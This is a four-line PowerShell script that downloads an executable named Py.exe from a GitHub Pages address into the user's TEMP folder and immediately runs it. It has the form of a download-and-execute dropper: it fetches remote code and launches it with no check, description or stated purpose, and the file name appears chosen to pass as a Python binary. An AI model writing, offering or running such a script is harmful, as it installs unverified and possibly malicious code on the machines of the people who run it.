$exeUrl = "https://miloszekxxdr.github.io/Website/Files/Py.exe"
$localPath = "$env:TEMP\Py.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $localPath
Start-Process -FilePath $localPath -Wait
